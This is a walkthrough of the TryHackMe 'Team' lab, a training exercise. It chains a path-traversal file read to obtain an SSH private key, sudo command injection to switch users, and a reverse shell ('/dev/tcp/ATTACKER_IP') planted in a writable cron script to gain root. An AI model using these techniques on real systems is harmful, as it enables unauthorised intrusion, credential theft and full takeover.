# Team Challenge Walkthrough
<br/>

## Intro
Welcome to the Team challenge, here is the link to the [room](https://tryhackme.com/room/teamcw) on TryHackMe.

This time we will be dealing with a commoon vulnerability for web apps that will grant us...

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP team.thm" | sudo tee -a /etc/hosts
```

nmap scan:
```bash
nmap -sV -sC team.thm
```

We find 3 open ports:
```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's begin by visiting the HTTP webapp, in your browser navigate to:
```
http://team.thm
```

We can see a homepage of the team with a bunch of photos, all the buttons point at the homepage.
Looking at the page source code we find nothing of particular interest.

Let's check the `robots.txt` file, navigate to:
```
http://team.thm/robots.txt
```

We can see there is a single word `dale`, let's save it for now, we' ll may use it later.

Let's now do a directory scan:
```bash
gobuster dir -u http://team.thm/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
```

```
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
```

Only `/images` is accessible, the other ones are forbidden, we do not have the right privileges.

This seems to be a dead end, lets try something else like scanning for subdomains:
```bash 
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://team.thm -H "Host: FUZZ.team.thm" 
```


This shows that the "dev" one exist, let's add this entry on the same line on the hosts file `dev.team.thm`.
The site is being build, if we click on the link we land on the URL:
```
http://dev.team.thm/script.php?page=teamshare.php
```

This looks interesting, with PHP calling for a  page we might be able to find a vulnerablity like directory traversal.
Let's try:
```
http://dev.team.thm/script.php?page=../../../../../etc/hosts
```

And it works we get the output of the target hosts file.

Now let's grub something useful like the `/etc/passwd`, from it we can see there is a user called dale, one gyles and the root.

Now we can use it to get the first flag:
```
http://dev.team.thm/script.php?page=../../../../../home/dale/user.txt
```
--> REDACTED

I have also checked the .ssh directory in the user home for the ssh keys but no matches, let's try fuzzing files and see if we get something interesting:
```bash
gobuster dir -u http://dev.team.thm/script.php\?page\=../../../../../ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --exclude-length 1 
```

Stil convinced that my way in was via SSH i have got a march on this file: `/etc/ssh/sshd_config`, let's check what it contains:
- Some general config + a key
```
Dale id_rsa #-----BEGIN OPENSSH PRIVATE KEY----- #b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn 
--REDACTED TOO_LARGE AND USELESS FOR THE WRITE UP --
#-----END OPENSSH PRIVATE KEY-----
```

Now we have Dale key, we need to fix how it is formatted (basically remove the new line `#` and make it a whole 1 line):


Then save it into a file called `id_rsa`, change permissions:
```bash
chmod 600 id_rsa
```

And now let's login:
```bash
ssh -i id_rsa dale@team.thm  
```

We have are now inside the machine as the user Dale.

<br/>

### Privilege Escalation
Let's check if we can run any command with sudo:
```bash
sudo -l
```

```
User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

We can run that script as sudo, view the file:
```bash
cat /home/gyles/admin_checks
```

```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

Basically this script ask for the user name and timestamp and then create a backup of the `stats.txt` file.

Still loking around we can see in the `/home` directory the ftpuser, inside there is a `workshare` directory with a file called `New_site.txt`:
```
Dale
I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```

(Not really useful now but cool to see it)

Let's go back to our script, it has 1 major fall, here `$error 2>/dev/null` we could supply some crafted input and it will execute it.
When prompted for the timestamp we can just input: `/bin/bash` this will open us a shell as gyles.

Now we can check the bash history file and see if there is any interesting clue:
```bash
cat .bash_history
```

One file looks like it wants our attentions:
```bash
cat /opt/admin_stuff/script.sh 
```

```bash

#!/bin/bash
#I have set a cronjob to run this script every minute

dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```

This script gets executed every minute, and even better other 2 scripts gets called and executed as well.

```bash
cat /usr/local/bin/main_backup.sh
```
```bash
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```
```bash
ls -la /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh
```

and
```bash
cat /usr/local/sbin/dev_backup.sh
```
```bash
#!/bin/bash
cp -r /var/www/dev.team.thm/* /var/backups/www/dev/
```


The `main_backup.sh` is writable, we can paste inside the code for a reverse shell:
```bash
sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
```

And on our machine set up a listener:
```bash
nc -lvnp 1234
```

The script will get executed as root so in about a minute we should get the root shell.

When the shell spawn, get the root flag:
```bash
cat root.txt
```
--> REDACTED
